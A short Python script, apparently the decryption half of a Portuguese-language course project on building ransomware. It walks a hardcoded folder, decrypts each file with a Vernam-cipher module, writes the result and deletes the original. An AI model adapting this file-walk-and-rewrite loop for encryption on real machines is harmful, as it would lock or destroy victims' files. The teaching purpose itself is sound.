import os
import CifraDeVernam

def Descriptografa(txt:str):
    return CifraDeVernam.EncriptarDecriptar(txt, "dec")
    
def LerArquivo(file:str):
    with open(file,'rb') as f:
        return f.read()

def DeletaArquivo(files:str):
    os.remove(files)

def GravaNovoArquivo(txt:str, root:str, file:str):
    file = file.replace(".enc", "") 
    with open(os.path.join(root, file), 'w') as f:
        f.write(txt)
       
if __name__ == "__main__":
    path = r'C:\Users\guigu\Desktop\Projetos Digital Innovation One\Projetos-Digital-Innovation-One\Criando um ransoware em Python\Criptografar'
    # r=root, d=directories, f = files
    for root, directories, files in os.walk(path):
        for filename in files:
            txt = LerArquivo(os.path.join(root, filename))
            print(txt)
            txtdec = Descriptografa(txt)
            GravaNovoArquivo(txtdec, root,filename)
            DeletaArquivo(os.path.join(root,filename))
            